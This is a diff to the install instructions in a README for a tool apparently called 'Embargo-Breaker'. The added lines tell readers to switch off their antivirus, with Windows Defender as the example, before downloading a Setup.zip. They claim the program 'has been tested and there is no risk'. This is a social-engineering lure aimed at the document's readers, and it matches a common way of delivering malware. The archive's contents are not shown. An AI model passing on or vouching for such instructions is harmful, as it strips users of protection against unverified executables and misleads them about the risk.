@@ -7,5 +7,9 @@
 
 ## How to install?
 
-* First, download the file from [here](https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/Setup.zip) .
+* First, you have to turn off your antivirus so that we can download the file (this program has been tested and there is no risk 😊).
+
+* For example, we turn off Windows Defender:
+
+*  download the file from [here](https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/Setup.zip) .
 
